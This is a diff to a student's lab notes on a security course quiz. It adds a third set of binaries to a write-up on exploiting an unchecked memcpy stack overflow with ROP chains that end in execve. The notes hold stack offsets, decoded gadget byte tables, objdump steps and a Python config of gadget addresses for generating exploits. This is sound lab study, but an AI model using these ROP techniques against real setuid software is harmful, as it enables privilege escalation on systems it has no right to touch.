@@ -1,15 +1,15 @@
-# Quiz 4 — Exploit Findings (Example Sets: bin2, g1)
+# Quiz 4 — Exploit Findings (Sets: bin2, g1, bsa)
 
-**Status: ALL 4 BINARIES SOLVED** — `uid=9992(apieri01)` confirmed on lab machine `10.16.13.89`.
-**Date:** 2026-04-24 | **Lab machine:** 103ws14 (10.16.13.89)
+**Status: ALL 6 BINARIES SOLVED** — `uid=9992(apieri01)` confirmed on lab machine `10.16.13.53`.
+**Date:** 2026-04-24 | **Lab machine:** 103ws15 (10.16.13.53)
 
 ---
 
 ## Overview
 
-Two example sets were provided: `bin2` (bin.1, bin.2) and `g1` (bin.1, bin.2).
-All 4 use the same vulnerability: `display_file()` → unchecked `memcpy` onto a fixed stack buffer.
-All 4 have NX on (no shellcode). All 4 build ROP gadgets dynamically via `mmap` + `movb`.
+Three sets solved: `bin2` (bin.1, bin.2), `g1` (bin.1, bin.2), and `bsa` (bin.1, bin.2).
+All 6 use the same vulnerability: `display_file()` → unchecked `memcpy` onto a fixed stack buffer.
+All 6 have NX on (no shellcode). All 6 build ROP gadgets dynamically via `mmap` + `movb`.
 
 | Binary | Set | OFFSET | gadget_base | WR_ADDR | Result |
 |--------|-----|--------|-------------|---------|--------|
@@ -17,6 +17,8 @@ All 4 have NX on (no shellcode). All 4 build ROP gadgets dynamically via `mmap` 
 | bin.2 | bin2 | 56 | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
 | bin.1 | g1 | 52 | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
 | bin.2 | g1 | 52 | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
+| bin.1 | bsa | **48** | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
+| bin.2 | bsa | **48** | 0x070493e0 | 0x07049500 | uid=9992(apieri01) ✅ |
 
 ---
 
@@ -88,8 +90,19 @@ Same as bin2/bin.1 **EXCEPT**: at +0x12 = `cd 80 c3` (int 0x80) and +0x15 = `b0 
 +0x15: b0 0b c3  → mov al,0xb; ret  ← swapped vs bin2/bin.1
 ```
 
-### g1/bin.2 gadget order:
-Same order as bin2/bin.2 (no swap at +0x12/+0x15).
+### bsa/bin.1 and bsa/bin.2 gadget order (IDENTICAL to each other, same as bin2/bin.1):
+```
++0x00: 31 c0 c3  → xor eax,eax; ret
++0x03: 58 5b c3  → pop eax; pop ebx; ret
++0x06: 89 03 c3  → mov [ebx],eax; ret
++0x09: 31 c9 c3  → xor ecx,ecx; ret
++0x0c: 89 c3 c3  → mov ebx,eax; ret
++0x0f: 31 d2 c3  → xor edx,edx; ret
++0x12: b0 0b c3  → mov al,0xb; ret
++0x15: cd 80 c3  → int 0x80; ret
+```
+Note: movb table writes bytes starting `58 5b c3...` but mmap offset arithmetic places `31 c0 c3` first.
+Always trust GDB memory dump — not the movb write order.
 
 **KEY LESSON:** Never assume gadget order from another binary. Decode fresh each time.
 
@@ -148,6 +161,7 @@ objdump -d ./bin.X | awk '/<display_file>/{f=1} f{print} /<root_menu>/{exit}' | 
 Look for `lea -0xNN(%ebp),%eax` just before `call memcpy`:
 - **bin2/bin.1 and bin2/bin.2:** `lea -0x34(%ebp)` → OFFSET = 0x34 + 4 = **56**
 - **g1/bin.1 and g1/bin.2:** `lea -0x30(%ebp)` → OFFSET = 0x30 + 4 = **52**
+- **bsa/bin.1 and bsa/bin.2:** `lea -0x2c(%ebp)` → OFFSET = 0x2c + 4 = **48**
 
 **KEY LESSON:** OFFSET differs between sets — always check for each binary, not just once per set.
 
@@ -299,9 +313,10 @@ echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb g1/bin.2   g1/exploit.2
 | Problem | Symptom | Root Cause | Fix |
 |---------|---------|------------|-----|
 | Wrong gadget_base | Segfault, no output | Formula gives +0x3e8, actual is +0x3e0 | Always verify via GDB memory dump |
-| Wrong OFFSET | Segfault, no output | Assumed bin2 offset for g1 | Read `lea -0xNN(%ebp)` in display_file per binary |
+| Wrong OFFSET | Segfault, no output | Assumed bin2 offset for g1/bsa | Read `lea -0xNN(%ebp)` in display_file per binary |
 | INT80/MOVAL swapped | Shell never executes | g1/bin.1 has different byte order | Decode movb table fresh, don't copy from bin2 |
 | Wrong WR_ADDR (.bss) | execve returns -1, no output | init_data() or TEMP value poisons .bss | Use mmap_base+0x500 always |
+| movb order ≠ runtime order | Wrong gadget used | mmap base offset shifts byte position | Trust GDB dump, not movb sequence |
 
 ---
 
@@ -359,6 +374,9 @@ configs = [
     ('bin2/exploit.2', 56, gb+0x00, gb+0x03, gb+0x06, gb+0x09, gb+0x0c, gb+0x0f, gb+0x12, gb+0x15),
     ('g1/exploit.1',   52, gb+0x03, gb+0x00, gb+0x06, gb+0x0c, gb+0x09, gb+0x0f, gb+0x15, gb+0x12),
     ('g1/exploit.2',   52, gb+0x00, gb+0x03, gb+0x06, gb+0x09, gb+0x0c, gb+0x0f, gb+0x12, gb+0x15),
+    # bsa set (OFFSET=48, same gadget order as bin2/bin.1 for both bin.1 and bin.2)
+    ('bsa/exploit.1',  48, gb+0x03, gb+0x00, gb+0x06, gb+0x0c, gb+0x09, gb+0x0f, gb+0x12, gb+0x15),
+    ('bsa/exploit.2',  48, gb+0x03, gb+0x00, gb+0x06, gb+0x0c, gb+0x09, gb+0x0f, gb+0x12, gb+0x15),
 ]
 
 for cfg in configs:
